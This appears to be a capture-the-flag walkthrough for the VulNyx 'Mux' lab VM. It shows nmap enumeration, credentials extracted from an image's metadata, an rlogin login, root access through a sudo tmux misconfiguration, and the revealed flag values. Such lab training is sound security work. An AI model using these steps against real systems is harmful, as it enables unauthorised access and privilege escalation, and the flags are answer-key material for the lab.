# VulNyx - Mux

## Information

## Solution
### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sCV -p- -T4 192.168.11.14  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 08:07 +07
Nmap scan report for 192.168.11.14
Host is up (0.0019s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Monna Lisa
512/tcp open  exec    netkit-rsh rexecd
513/tcp open  login
514/tcp open  shell   Netkit rshd
MAC Address: 08:00:27:C7:DD:4F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.26 seconds
```
![web port 80](/walkthroughs/vulnyx/low-difficulty/17_mux/web-monnalisa.png)

![web source page](/walkthroughs/vulnyx/low-difficulty/17_mux/source-page.png)

### Shell
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ wget -q "http://192.168.11.14/image.jpg" 
                                                                                   
┌──(dungcngo㉿kali)-[/tmp]
└─$ exiftool image.jpg                               
ExifTool Version Number         : 13.36
File Name                       : image.jpg
Directory                       : .
File Size                       : 260 kB
File Modification Date/Time     : 2023:12:01 16:32:14+07:00
File Access Date/Time           : 2026:05:06 08:51:39+07:00
File Inode Change Date/Time     : 2026:05:06 08:50:33+07:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Comment                         : lisa:My_$3cUr3_RSH_p@zz <---- Notice
Image Width                     : 800
Image Height                    : 1188
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 800x1188
Megapixels                      : 0.950

┌──(dungcngo㉿kali)-[/tmp]
└─$ strings image.jpg -n 10    
lisa:My_$3cUr3_RSH_p@zz
"x|+;"Lj2!4
^kD<;4dQeDGa
(bEFo0(gs|
1U:HAvm,n
#zAShuj7`1
4phV1&Qcd_
|"sBI,g# k([B
S^W9,S#6]K
{aidWDq#&bf
2fNPJ]H6Wn
QW>k0V:}GO}
<M) VOT}W'
b       #+ rI-eGn
#p~-gl_;,a
UGr3RWgM,2
E[t7Clce|`6
lisa:Gi0c0nd@        <----- This is leaked credentials

```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ rlogin 192.168.11.14 -l lisa
Password: 
lisa@mux:~$ id ; whoami
uid=1000(lisa) gid=1000(lisa) grupos=1000(lisa)
lisa
lisa@mux:~$ 
```

### Privilege Escalation
#### Enumeration
```bash
lisa@mux:~$ ls -la
total 24
drwx------ 2 lisa lisa 4096 dic  1  2023 .
drwxr-xr-x 3 root root 4096 dic  1  2023 ..
lrwxrwxrwx 1 root root    9 abr 23  2023 .bash_history -> /dev/null
-rw------- 1 lisa lisa  220 ene 15  2023 .bash_logout
-rw------- 1 lisa lisa 3526 ene 15  2023 .bashrc
-rw------- 1 lisa lisa  807 ene 15  2023 .profile
-r-------- 1 lisa lisa   33 dic  1  2023 user.txt
lisa@mux:~$ sudo -l
Matching Defaults entries for lisa on mux:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lisa may run the following commands on mux:
    (root) NOPASSWD: /usr/bin/tmux
```

#### Abuse
![tmux-shell](/walkthroughs/vulnyx/low-difficulty/17_mux/tmux-shell.png)

```bash
lisa@mux:~$ sudo /usr/bin/tmux -c /bin/bash
root@mux:/home/lisa# id ; hostname
uid=0(root) gid=0(root) grupos=0(root)
mux
root@mux:/home/lisa# 
```

#### Flags
```bash
root@mux:/home/lisa# find / -name root.txt -o -name user.txt 2>/dev/null | xargs cat
bcb441bf0878dca6f6d4d2c7787c6f4b
be2034f028ebe41244687a8498c7cd3d
```

***You are welcome!***
